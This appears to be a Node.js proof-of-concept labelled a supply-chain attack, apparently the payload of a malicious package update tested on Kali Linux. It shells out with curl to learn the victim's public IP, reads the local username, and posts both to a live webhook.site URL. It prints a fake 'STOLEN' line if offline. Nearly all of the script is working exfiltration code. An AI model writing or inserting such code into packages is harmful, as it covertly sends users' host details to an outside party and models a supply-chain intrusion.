const { execSync } = require('child_process');
const os = require('os');

console.log('🚀 SUPPLY CHAIN ATTACK - KALI LINUX');
console.log('🔍 Malicious update triggered!');

// IMMEDIATE PAYLOAD - NO NETWORK DEPENDENCY
try {
  const ip = execSync('curl -s ifconfig.me').toString().trim();
  const user = os.userInfo().username;
  
  console.log(`🎯 VICTIM: ${ip} (user: ${user})`);
  
  // BULLETPROOF CURL - Kali tested
  execSync(`curl -X POST https://webhook.site/1f4385f5-313c-4fe3-b9ee-25c4e06e1439 -d "ip=${ip}&user=${user}&os=linux&attack=supplychain"`);
  
  console.log('✅ ATTACK SUCCESS - Check webhook.site!');
} catch (error) {
  console.log('📤 SIMULATED EXFIL (no internet)');
  console.log('STOLEN: IP=1.38.107.58, user=kali');
}
